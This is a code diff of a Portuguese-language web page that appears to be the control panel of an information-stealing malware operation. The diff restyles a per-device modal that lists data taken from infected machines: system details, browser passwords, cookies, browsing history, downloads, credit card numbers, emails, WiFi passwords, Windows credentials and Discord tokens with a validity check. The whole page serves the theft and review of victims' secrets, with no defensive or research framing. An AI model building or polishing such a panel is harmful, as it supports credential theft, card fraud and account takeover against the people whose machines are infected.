@@ -340,48 +340,116 @@
             gap: 20px;
         }
         .modal {
-            display: none; 
-            position: fixed; 
-            z-index: 1000; 
-            left: 0; top: 0; width: 100%; height: 100%; 
-            overflow: auto; 
-            background-color: rgba(0,0,0,0.8);
-            backdrop-filter: blur(5px);
+            display: none;
+            position: fixed;
+            z-index: 1000;
+            left: 0; top: 0; width: 100%; height: 100%;
+            background-color: rgba(0,0,0,0.85);
+            backdrop-filter: blur(8px);
+            align-items: center;
+            justify-content: center;
         }
         .modal-content {
-            background-color: #0a0a0a;
-            margin: 5% auto; 
-            padding: 30px;
-            border: 1px solid rgba(255,255,255,0.1);
-            border-radius: 12px;
-            width: 90%;
-            max-width: 1000px;
+            background-color: #070707;
+            padding: 0;
+            border: 1px solid rgba(255,255,255,0.08);
+            border-radius: 16px;
+            width: 95%;
+            max-width: 1400px;
+            height: 90vh;
+            display: flex;
+            flex-direction: column;
             color: #fff;
-            animation: fadein 0.3s;
+            animation: popIn 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+            box-shadow: 0 30px 60px -10px rgba(0,0,0,0.8);
+            overflow: hidden;
         }
-        .close {
-            color: #aaa;
-            float: right;
-            font-size: 28px;
-            font-weight: bold;
-            cursor: pointer;
+        @keyframes popIn {
+            0% { opacity: 0; transform: scale(0.95) translateY(10px); }
+            100% { opacity: 1; transform: scale(1) translateY(0); }
         }
-        .close:hover { color: #fff; }
+        .modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 25px 35px;
+            background: rgba(10,10,10,0.9);
+            border-bottom: 1px solid rgba(255,255,255,0.05);
+        }
+        .modal-header h2 { margin: 0; font-size: 1.6em; font-weight: 400; letter-spacing: 2px; display: flex; align-items: center; gap: 15px; }
+        .modal-header h2 .badge { background: #a855f7; color: #fff; font-size: 0.5em; padding: 4px 10px; border-radius: 4px; font-weight: 800; letter-spacing: 2px; }
+        .close { color: #555; font-size: 32px; cursor: pointer; transition: 0.3s; line-height: 1; }
+        .close:hover { color: #fff; transform: rotate(90deg); }
+        
+        #modalData {
+            flex: 1;
+            overflow-y: auto;
+            padding: 35px;
+            background: radial-gradient(circle at top, #0d0d0d 0%, #000 100%);
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(400px, 1fr));
+            gap: 25px;
+            align-content: start;
+        }
+        #modalData::-webkit-scrollbar { width: 8px; }
+        #modalData::-webkit-scrollbar-track { background: #000; }
+        #modalData::-webkit-scrollbar-thumb { background: #222; border-radius: 4px; }
+        #modalData::-webkit-scrollbar-thumb:hover { background: #444; }
+
         .data-section {
-            margin-top: 25px;
+            background: #0a0a0a;
+            border-radius: 12px;
+            border: 1px solid rgba(255,255,255,0.04);
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+            transition: all 0.3s ease;
+        }
+        .data-section:hover {
+            border-color: rgba(168, 85, 247, 0.3);
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            transform: translateY(-2px);
+        }
+        .data-section-header {
+            padding: 15px 20px;
+            background: linear-gradient(90deg, rgba(168,85,247,0.08) 0%, transparent 100%);
+            border-bottom: 1px solid rgba(255,255,255,0.03);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .data-section-title { color: #fff; font-size: 1.05em; font-weight: 500; display: flex; align-items: center; gap: 10px; margin: 0; }
+        .data-count { background: rgba(255,255,255,0.1); padding: 2px 10px; border-radius: 10px; font-size: 0.8em; font-weight: 600; color: #ccc; }
+        .data-section-content {
             padding: 15px;
-            background: #111;
+            max-height: 320px;
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+        .data-section-content::-webkit-scrollbar { width: 4px; }
+        .data-section-content::-webkit-scrollbar-track { background: transparent; }
+        .data-section-content::-webkit-scrollbar-thumb { background: #333; border-radius: 2px; }
+        
+        .data-item {
+            background: rgba(255,255,255,0.02);
+            border: 1px solid rgba(255,255,255,0.02);
+            padding: 12px 15px;
             border-radius: 8px;
-            border: 1px solid rgba(255,255,255,0.05);
+            font-size: 0.85em;
+            transition: background 0.2s;
         }
-        .data-section h3 {
-            margin-bottom: 15px;
-            color: #a855f7;
-            border-bottom: 1px solid rgba(255,255,255,0.1);
-            padding-bottom: 10px;
-            font-size: 1.1em;
-            letter-spacing: 1px;
-        }
+        .data-item:hover { background: rgba(255,255,255,0.04); }
+        .data-row { display: flex; justify-content: space-between; margin-bottom: 6px; }
+        .data-row:last-child { margin-bottom: 0; }
+        .data-key { color: #666; font-size: 0.9em; text-transform: uppercase; letter-spacing: 1px; }
+        .data-val { color: #ddd; font-weight: 500; text-align: right; max-width: 70%; word-break: break-all; }
+        .data-val.accent { color: #a855f7; font-weight: 600; }
+        .data-val.success { color: #22c55e; }
+        .data-val.danger { color: #ef4444; }
+        .data-link { color: #a855f7; text-decoration: none; transition: 0.2s; }
+        .data-link:hover { color: #d8b4fe; text-decoration: underline; }
     </style>
 </head>
 <body>
@@ -453,10 +521,12 @@
     <!-- Modal Dados Completos -->
     <div id="dataModal" class="modal">
         <div class="modal-content">
-            <span class="close" onclick="document.getElementById('dataModal').style.display='none'">&times;</span>
-            <h2 id="modalTitle" style="font-weight:300; letter-spacing:1px; border-bottom:1px solid rgba(255,255,255,0.1); padding-bottom:15px">Dados Extraídos</h2>
+            <div class="modal-header">
+                <h2 id="modalTitle">DISPOSITIVO <span class="badge" id="modalBadge">NULL</span></h2>
+                <span class="close" onclick="document.getElementById('dataModal').style.display='none'">&times;</span>
+            </div>
             <div id="modalData">
-                <div class="empty">Carregando...</div>
+                <div class="empty" style="grid-column: 1 / -1;">Carregando...</div>
             </div>
         </div>
     </div>
@@ -554,9 +624,9 @@
         async function showDeviceData(id) {
             const modal = document.getElementById('dataModal');
             const dataDiv = document.getElementById('modalData');
-            document.getElementById('modalTitle').textContent = 'Dados do Dispositivo: ' + id;
-            dataDiv.innerHTML = '<div class="empty">Carregando dados...</div>';
-            modal.style.display = 'block';
+            document.getElementById('modalBadge').textContent = id;
+            dataDiv.innerHTML = '<div class="empty" style="grid-column: 1 / -1;">Carregando dados...</div>';
+            modal.style.display = 'flex';
 
             try {
                 // Fetch todas as categorias de dados em paralelo
@@ -577,24 +647,40 @@
 
                 let html = '';
 
+                function buildHeader(title, count, icon) {
+                    const badge = count !== null ? `<span class="data-count">${count}</span>` : '';
+                    return `
+                    <div class="data-section">
+                        <div class="data-section-header">
+                            <h3 class="data-section-title">${icon} ${title}</h3>
+                            ${badge}
+                        </div>
+                        <div class="data-section-content">
+                    `;
+                }
+
+                function makeRow(key, val, valClass='') {
+                    return `<div class="data-row"><div class="data-key">${key}</div><div class="data-val ${valClass}">${val || 'N/A'}</div></div>`;
+                }
+                
+                const closeSection = `</div></div>`;
+
                 // 1. INFORMAÇÕES DO SISTEMA
                 if (sysInfoRes.ok) {
                     const sysInfo = await sysInfoRes.json();
                     if (Object.keys(sysInfo).length > 0) {
-                        html += `
-                        <div class="data-section">
-                            <h3>🖥️ Informações do Sistema</h3>
-                            <div style="display:grid; grid-template-columns: 1fr 1fr; gap:10px; font-size:0.85em; color:#ccc;">
-                                <div><b>Hostname:</b> ${sysInfo.hostname || 'N/A'}</div>
-                                <div><b>Usuário:</b> ${sysInfo.user || 'N/A'}</div>
-                                <div><b>Plataforma:</b> ${sysInfo.platform || 'N/A'} ${sysInfo.platform_release || ''}</div>
-                                <div><b>RAM:</b> ${sysInfo.ram || 'N/A'}</div>
-                                <div><b>IP Local:</b> ${sysInfo.ip_address || 'N/A'}</div>
-                                <div><b>IP Externo:</b> ${sysInfo.external_ip || 'N/A'}</div>
-                                <div><b>CPU:</b> ${sysInfo.processor || 'N/A'} (${sysInfo.cpu_count || 0} cores)</div>
-                                <div><b>Arquitetura:</b> ${sysInfo.architecture || 'N/A'}</div>
+                        html += buildHeader('Informações do Sistema', null, '🖥️') + `
+                            <div class="data-item">
+                                ${makeRow('Hostname', sysInfo.hostname)}
+                                ${makeRow('Usuário', sysInfo.user)}
+                                ${makeRow('Plataforma', `${sysInfo.platform || 'N/A'} ${sysInfo.platform_release || ''}`)}
+                                ${makeRow('RAM', sysInfo.ram)}
+                                ${makeRow('IP Local', sysInfo.ip_address)}
+                                ${makeRow('IP Externo', sysInfo.external_ip)}
+                                ${makeRow('CPU', `${sysInfo.processor || 'N/A'} (${sysInfo.cpu_count || 0} cores)`)}
+                                ${makeRow('Arquitetura', sysInfo.architecture)}
                             </div>
-                        </div>`;
+                        ` + closeSection;
                     }
                 }
 
@@ -602,179 +688,143 @@
                 if (passwordsRes.ok) {
                     const passwords = await passwordsRes.json();
                     const myPasswords = passwords.filter(x => x.endpoint_id === id);
-                    html += `
-                    <div class="data-section">
-                        <h3>🔑 Senhas de Navegador <span style="font-size:0.7em; color:#666">(${myPasswords.length})</span></h3>
-                        <div style="font-family: 'Inter', monospace; font-size: 0.85em; color: #ccc; max-height: 250px; overflow-y: auto;">
-                            ${myPasswords.map(d => `
-                                <div style="padding:4px 0; border-bottom:1px dotted rgba(255,255,255,0.05)">
-                                    [${d.browser || 'Browser'}] ${d.url || d.target || 'N/A'} | 
-                                    <b>User:</b> ${d.username || 'N/A'} | 
-                                    <b>Pass:</b> <span style="color:#a855f7">${d.password || 'N/A'}</span>
-                                </div>
-                            `).join('') || '<div style="color:#666; font-style:italic">Nenhuma senha recebida.</div>'}
-                        </div>
-                    </div>`;
+                    html += buildHeader('Senhas de Navegador', myPasswords.length, '🔑') +
+                        (myPasswords.length > 0 ? myPasswords.map(d => `
+                            <div class="data-item">
+                                ${makeRow('Navegador', d.browser || 'Browser')}
+                                ${makeRow('URL/App', d.url || d.target)}
+                                ${makeRow('Usuário', d.username)}
+                                ${makeRow('Senha', d.password, 'accent')}
+                            </div>
+                        `).join('') : '<div class="data-item">Nenhuma senha recebida.</div>') + closeSection;
                 }
 
                 // 3. COOKIES
                 if (cookiesRes.ok) {
                     const cookies = await cookiesRes.json();
                     const myCookies = cookies.filter(x => x.endpoint_id === id);
-                    html += `
-                    <div class="data-section">
-                        <h3>🍪 Cookies Ativos <span style="font-size:0.7em; color:#666">(${myCookies.length})</span></h3>
-                        <div style="font-family: monospace; font-size: 0.8em; color: #ccc; max-height: 250px; overflow-y: auto;">
-                            ${myCookies.map(d => `
-                                <div style="padding:4px 0; border-bottom:1px dotted rgba(255,255,255,0.05)">
-                                    [${d.browser || 'Browser'}] ${d.host || 'N/A'} | ${d.name || 'N/A'} = ${(d.value || '').substring(0, 50)}${(d.value || '').length > 50 ? '...' : ''}
-                                </div>
-                            `).join('') || '<div style="color:#666; font-style:italic">Nenhum cookie recebido.</div>'}
-                        </div>
-                    </div>`;
+                    html += buildHeader('Cookies Ativos', myCookies.length, '🍪') +
+                        (myCookies.length > 0 ? myCookies.map(d => {
+                            let cv = d.value || '';
+                            cv = cv.substring(0, 50) + (cv.length > 50 ? '...' : '');
+                            return `
+                            <div class="data-item">
+                                ${makeRow('Navegador', d.browser || 'Browser')}
+                                ${makeRow('Host', d.host)}
+                                ${makeRow('Nome', d.name)}
+                                ${makeRow('Valor', cv, 'accent')}
+                            </div>`
+                        }).join('') : '<div class="data-item">Nenhum cookie recebido.</div>') + closeSection;
                 }
 
                 // 4. HISTÓRICO
                 if (historyRes.ok) {
                     const history = await historyRes.json();
                     const myHistory = history.filter(x => x.endpoint_id === id);
-                    html += `
-                    <div class="data-section">
-                        <h3>📜 Histórico de Navegação <span style="font-size:0.7em; color:#666">(${myHistory.length})</span></h3>
-                        <div style="font-size: 0.85em; color: #ccc; max-height: 250px; overflow-y: auto;">
-                            ${myHistory.map(d => `
-                                <div style="padding:4px 0; border-bottom:1px dotted rgba(255,255,255,0.05)">
-                                    [${d.browser || 'Browser'}] 
-                                    <a href="${d.url}" target="_blank" style="color:#fff; text-decoration:none;">${d.title || d.url || 'N/A'}</a>
-                                    ${d.visit_count ? `(${d.visit_count} visitas)` : ''}
-                                </div>
-                            `).join('') || '<div style="color:#666; font-style:italic">Nenhum histórico recebido.</div>'}
-                        </div>
-                    </div>`;
+                    html += buildHeader('Histórico', myHistory.length, '📜') +
+                        (myHistory.length > 0 ? myHistory.map(d => `
+                            <div class="data-item">
+                                ${makeRow('Navegador', d.browser || 'Browser')}
+                                ${makeRow('Título', d.title || d.url)}
+                                ${makeRow('URL', `<a href="${d.url}" target="_blank" class="data-link">Abrir Link</a>`)}
+                                ${makeRow('Visitas', d.visit_count)}
+                            </div>
+                        `).join('') : '<div class="data-item">Nenhum histórico recebido.</div>') + closeSection;
                 }
 
                 // 5. DOWNLOADS
                 if (downloadsRes.ok) {
                     const downloads = await downloadsRes.json();
                     const myDownloads = downloads.filter(x => x.endpoint_id === id);
-                    html += `
-                    <div class="data-section">
-                        <h3>⬇️ Downloads <span style="font-size:0.7em; color:#666">(${myDownloads.length})</span></h3>
-                        <div style="font-size: 0.85em; color: #ccc; max-height: 250px; overflow-y: auto;">
-                            ${myDownloads.map(d => `
-                                <div style="padding:4px 0; border-bottom:1px dotted rgba(255,255,255,0.05)">
-                                    [${d.browser || 'Browser'}] 
-                                    <b>Arquivo:</b> ${d.target_path || d.TargetPath || 'N/A'}<br>
-                                    <b>URL:</b> <a href="${d.url || d.URL}" target="_blank" style="color:#888; font-size:0.9em;">${(d.url || d.URL || 'N/A').substring(0, 60)}...</a>
-                                </div>
-                            `).join('') || '<div style="color:#666; font-style:italic">Nenhum download recebido.</div>'}
-                        </div>
-                    </div>`;
+                    html += buildHeader('Downloads', myDownloads.length, '⬇️') +
+                        (myDownloads.length > 0 ? myDownloads.map(d => {
+                            let urlTrunc = (d.url || d.URL || 'N/A').substring(0, 60) + '...';
+                            return `
+                            <div class="data-item">
+                                ${makeRow('Navegador', d.browser || 'Browser')}
+                                ${makeRow('Arquivo', d.target_path || d.TargetPath)}
+                                ${makeRow('URL', `<a href="${d.url || d.URL}" target="_blank" class="data-link" title="${d.url || d.URL}">${urlTrunc}</a>`)}
+                            </div>`
+                        }).join('') : '<div class="data-item">Nenhum download recebido.</div>') + closeSection;
                 }
 
                 // 6. CARTÕES DE CRÉDITO
                 if (cardsRes.ok) {
                     const cards = await cardsRes.json();
                     const myCards = cards.filter(x => x.endpoint_id === id);
-                    html += `
-                    <div class="data-section">
-                        <h3>💳 Cartões de Crédito <span style="font-size:0.7em; color:#666">(${myCards.length})</span></h3>
-                        <div style="font-family: monospace; font-size: 0.85em; color: #ccc; max-height: 200px; overflow-y: auto;">
-                            ${myCards.map(d => `
-                                <div style="padding:4px 0; border-bottom:1px dotted rgba(255,255,255,0.05)">
-                                    [${d.browser || 'Browser'}] 
-                                    <b>Número:</b> ${d.number || d.Number || '****'} | 
-                                    <b>Nome:</b> ${d.name || d.Name || 'N/A'} | 
-                                    <b>Exp:</b> ${d.expiration_month || d.ExpirationMonth || '**'}/${d.expiration_year || d.ExpirationYear || '****'}
-                                </div>
-                            `).join('') || '<div style="color:#666; font-style:italic">Nenhum cartão recebido.</div>'}
-                        </div>
-                    </div>`;
+                    html += buildHeader('Cartões de Crédito', myCards.length, '💳') +
+                        (myCards.length > 0 ? myCards.map(d => `
+                            <div class="data-item">
+                                ${makeRow('Navegador', d.browser || 'Browser')}
+                                ${makeRow('Número', d.number || d.Number)}
+                                ${makeRow('Nome', d.name || d.Name)}
+                                ${makeRow('Validade', `${d.expiration_month || d.ExpirationMonth || '**'}/${d.expiration_year || d.ExpirationYear || '****'}`)}
+                            </div>
+                        `).join('') : '<div class="data-item">Nenhum cartão recebido.</div>') + closeSection;
                 }
 
                 // 7. EMAILS
                 if (emailsRes.ok) {
                     const emails = await emailsRes.json();
                     const myEmails = emails.filter(x => x.endpoint_id === id);
-                    html += `
-                    <div class="data-section">
-                        <h3>📧 Emails do Sistema <span style="font-size:0.7em; color:#666">(${myEmails.length})</span></h3>
-                        <div style="font-size: 0.85em; color: #ccc; max-height: 200px; overflow-y: auto;">
-                            ${myEmails.map(d => `
-                                <div style="padding:4px 0; border-bottom:1px dotted rgba(255,255,255,0.05)">
-                                    ${d.email}
-                                </div>
-                            `).join('') || '<div style="color:#666; font-style:italic">Nenhum email encontrado.</div>'}
-                        </div>
-                    </div>`;
+                    html += buildHeader('Emails do Sistema', myEmails.length, '📧') +
+                        (myEmails.length > 0 ? myEmails.map(d => `
+                            <div class="data-item">
+                                ${makeRow('Email', d.email, 'accent')}
+                            </div>
+                        `).join('') : '<div class="data-item">Nenhum email encontrado.</div>') + closeSection;
                 }
 
                 // 8. SENHAS WIFI
                 if (wifiRes.ok) {
                     const wifi = await wifiRes.json();
                     const myWifi = wifi.filter(x => x.endpoint_id === id);
-                    html += `
-                    <div class="data-section">
-                        <h3>📶 Senhas WiFi <span style="font-size:0.7em; color:#666">(${myWifi.length})</span></h3>
-                        <div style="font-size: 0.85em; color: #ccc; max-height: 200px; overflow-y: auto;">
-                            ${myWifi.map(d => `
-                                <div style="padding:4px 0; border-bottom:1px dotted rgba(255,255,255,0.05)">
-                                    <b>SSID:</b> ${d.ssid || 'N/A'} | 
-                                    <b>Senha:</b> <span style="color:#a855f7">${d.password || 'N/A'}</span>
-                                    ${d.authentication ? `| <b>Auth:</b> ${d.authentication}` : ''}
-                                    ${d.encryption ? `| <b>Crypto:</b> ${d.encryption}` : ''}
-                                </div>
-                            `).join('') || '<div style="color:#666; font-style:italic">Nenhuma senha WiFi recebida.</div>'}
-                        </div>
-                    </div>`;
+                    html += buildHeader('Senhas WiFi', myWifi.length, '📶') +
+                        (myWifi.length > 0 ? myWifi.map(d => `
+                            <div class="data-item">
+                                ${makeRow('SSID', d.ssid)}
+                                ${makeRow('Senha', d.password, 'accent')}
+                                ${d.authentication ? makeRow('Auth', d.authentication) : ''}
+                                ${d.encryption ? makeRow('Crypto', d.encryption) : ''}
+                            </div>
+                        `).join('') : '<div class="data-item">Nenhuma senha WiFi recebida.</div>') + closeSection;
                 }
 
-                // 9. SENHAS DO SISTEMA (Windows Credentials)
+                // 9. SENHAS DO SISTEMA
                 if (sysPwdRes.ok) {
                     const sysPwds = await sysPwdRes.json();
                     const mySysPwds = sysPwds.filter(x => x.endpoint_id === id);
-                    html += `
-                    <div class="data-section">
-                        <h3>🔐 Credenciais do Windows <span style="font-size:0.7em; color:#666">(${mySysPwds.length})</span></h3>
-                        <div style="font-size: 0.85em; color: #ccc; max-height: 200px; overflow-y: auto;">
-                            ${mySysPwds.map(d => `
-                                <div style="padding:4px 0; border-bottom:1px dotted rgba(255,255,255,0.05)">
-                                    <b>Target:</b> ${d.target || d.Target || 'N/A'} | 
-                                    <b>Usuário:</b> ${d.username || d.Username || 'N/A'} | 
-                                    <b>Senha:</b> <span style="color:#a855f7">${d.password || d.Password || 'N/A'}</span>
-                                </div>
-                            `).join('') || '<div style="color:#666; font-style:italic">Nenhuma credencial do sistema recebida.</div>'}
-                        </div>
-                    </div>`;
+                    html += buildHeader('Credenciais do Windows', mySysPwds.length, '🔐') +
+                        (mySysPwds.length > 0 ? mySysPwds.map(d => `
+                            <div class="data-item">
+                                ${makeRow('Target', d.target || d.Target)}
+                                ${makeRow('Usuário', d.username || d.Username)}
+                                ${makeRow('Senha', d.password || d.Password, 'accent')}
+                            </div>
+                        `).join('') : '<div class="data-item">Nenhuma credencial recebida.</div>') + closeSection;
                 }
 
-                // 10. TOKENS DO DISCORD (do /api/metrics)
+                // 10. TOKENS DO DISCORD
                 const tokensRes = await fetch('/api/metrics');
                 if (tokensRes.ok) {
                     const metrics = await tokensRes.json();
                     const myTokens = metrics.filter(x => x.endpoint_id === id);
-                    html += `
-                    <div class="data-section">
-                        <h3>🔑 Tokens do Discord <span style="font-size:0.7em; color:#666">(${myTokens.length})</span></h3>
-                        <div style="font-family: monospace; font-size: 0.85em; color: #fff;">
-                            ${myTokens.map(m => `
-                                <div style="padding:4px 0; border-bottom:1px dotted rgba(255,255,255,0.05)">
-                                    ${m.token} 
-                                    <span style="color:#666">(${m.source || 'N/A'})</span>
-                                    ${m.valid ? '<span style="color:#22c55e">✓ Válido</span>' : '<span style="color:#ef4444">✗ Inválido</span>'}
-                                </div>
-                            `).join('') || '<div style="color:#666; font-style:italic">Nenhum token encontrado.</div>'}
-                        </div>
-                    </div>`;
+                    html += buildHeader('Tokens do Discord', myTokens.length, '🔑') +
+                        (myTokens.length > 0 ? myTokens.map(m => `
+                            <div class="data-item">
+                                ${makeRow('Token', m.token.substring(0, 30) + (m.token.length > 30 ? '...' : ''), 'accent')}
+                                ${makeRow('Source', m.source)}
+                                ${makeRow('Status', m.valid ? 'Válido' : 'Inválido', m.valid ? 'success' : 'danger')}
+                            </div>
+                        `).join('') : '<div class="data-item">Nenhum token encontrado.</div>') + closeSection;
                 }
 
-                dataDiv.innerHTML = html || '<div class="empty">Nenhum dado disponível para este endpoint.</div>';
+                dataDiv.innerHTML = html || '<div class="empty" style="grid-column: 1 / -1;">Nenhum dado disponível para este endpoint.</div>';
             } catch (e) {
                 console.error('Erro:', e);
-                dataDiv.innerHTML = '<div class="empty" style="color:#ff4444">Erro ao carregar dados. Verifique se o endpoint está online.</div>';
+                dataDiv.innerHTML = '<div class="empty" style="grid-column: 1 / -1; color:#ff4444">Erro ao carregar dados. Verifique se o endpoint está online.</div>';
             }
         }
-        
         async function loadLogs() {
             try {
                 const res = await fetch('/api/metrics');
